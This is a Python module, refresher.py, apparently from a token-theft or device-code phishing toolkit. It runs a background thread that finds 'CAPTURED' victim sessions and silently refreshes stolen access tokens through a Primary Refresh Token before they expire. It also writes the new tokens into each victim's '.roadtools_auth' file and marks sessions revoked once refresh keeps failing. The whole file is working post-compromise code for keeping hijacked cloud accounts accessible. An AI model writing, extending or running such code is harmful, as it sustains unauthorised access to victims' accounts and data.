# ── refresher.py ──────────────────────────────────────────
import os
import time
import datetime
import logging
import threading
import json
import db
import executor

logger = logging.getLogger(__name__)

def update_victim_auth_file(user_code, access_token, refresh_token, expires_in):
    """Keep the victim's .roadtools_auth in sync with refreshed tokens."""
    victim_path = os.path.join(executor.VICTIMS_DIR, user_code)
    auth_file = os.path.join(victim_path, '.roadtools_auth')
    if os.path.exists(auth_file):
        try:
            with open(auth_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            data['accessToken'] = access_token
            if refresh_token:
                data['refreshToken'] = refresh_token
            future = datetime.datetime.utcnow() + datetime.timedelta(seconds=expires_in)
            data['expiresOn'] = future.strftime('%Y-%m-%d %H:%M:%S')
            with open(auth_file, 'w', encoding='utf-8') as f:
                json.dump(data, f)
        except Exception as e:
            logger.debug(f"Could not update .roadtools_auth for {user_code}: {e}")

class TokenRefresher(threading.Thread):
    def __init__(self, check_interval=30):
        super().__init__(daemon=True)
        self._running = True
        self.check_interval = check_interval
        self._prt_failures = {}  # user_code -> consecutive PRT refresh failures

    def run(self):
        logger.info(f"Token Refresher thread started (Auto-refresh threshold: 10m remaining).")
        while self._running:
            try:
                now_ts = int(time.time())
                sessions = db.get_all_sessions()
                for s in sessions:
                    if s['status'] == 'CAPTURED':
                        expiry = s.get('access_token_expiry') or 0
                        time_left = expiry - now_ts

                        # Only act when 10 minutes (600 seconds) or less remain
                        if time_left <= 600:
                            uc = s['user_code']
                            # PRT-only refresh — no fallback to oauth broker grant
                            success, new_at, new_exp = executor.refresh_via_prt(uc)
                            if success:
                                self._prt_failures.pop(uc, None)
                                logger.info(
                                    f"✓ Silently auto-refreshed (PRT) token for {uc} "
                                    f"(Next expiry in {new_exp - now_ts}s)"
                                )
                            else:
                                fails = self._prt_failures.get(uc, 0) + 1
                                self._prt_failures[uc] = fails
                                if fails >= 3:
                                    # 3 consecutive refresh failures (~90s): the credentials
                                    # were almost certainly rotated/revoked externally (password
                                    # change, admin reset, MFA policy). Flip the session to
                                    # REVOKED so every dashboard reflects reality automatically.
                                    try:
                                        db.update_session_status(uc, 'REVOKED')
                                        logger.warning(
                                            f"🔒 {uc}: PRT refresh failed {fails}x consecutively — "
                                            f"session auto-marked REVOKED (credentials likely rotated)."
                                        )
                                    except Exception as e:
                                        logger.error(f"Failed to auto-revoke {uc}: {e}")
                                    self._prt_failures.pop(uc, None)
                                else:
                                    logger.warning(
                                        f"⚠ PRT refresh failed for {uc} ({fails}/3) — token will expire soon. "
                                        f"Re-run the post-compromise chain or re-capture the session."
                                    )
            except Exception as e:
                logger.error(f"Error in token refresher thread: {e}")

            # Sleep in 1-second increments so stop() responds immediately
            for _ in range(self.check_interval):
                if not self._running:
                    break
                time.sleep(1)

    def stop(self):
        self._running = False
